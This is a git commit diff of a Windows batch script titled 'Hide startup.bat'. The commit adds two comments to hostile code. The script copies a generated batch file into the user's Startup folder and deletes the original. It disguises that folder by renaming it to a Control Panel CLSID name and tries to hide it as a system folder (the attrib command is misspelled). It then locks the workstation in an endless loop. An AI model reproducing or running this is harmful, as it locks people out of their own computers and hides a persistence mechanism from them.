c61717834ba51ff2bf7e32c3c1a1a5a691cf3fcf
MarkasMark567 <113364058+MarkasMark567@users.noreply.github.com>
2022-11-03 20:31:41 -0400

    Update Hide startup.bat

--- Hide startup.bat
+++ Hide startup.bat
@@ -13,9 +13,11 @@ echo goto a
 REM Copying it to startup and then deleting the original
 COPY "File.bat" "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 del File.bat /q
+REM renaming the Startup folder to a control panel name and then hide it and set it to a system file
 cd "C:\Users\1651176\AppData\Roaming\Microsoft\Windows\Start Menu\Programs"
 ren Startup "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 atrrib +h +s "Control Panel.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
+REM Locing the user out until they reboot which is when the startup folder activates with the file created above in it
 :Lock
 rundll32.exe user32.dll, LockWorkStation
 goto Lock
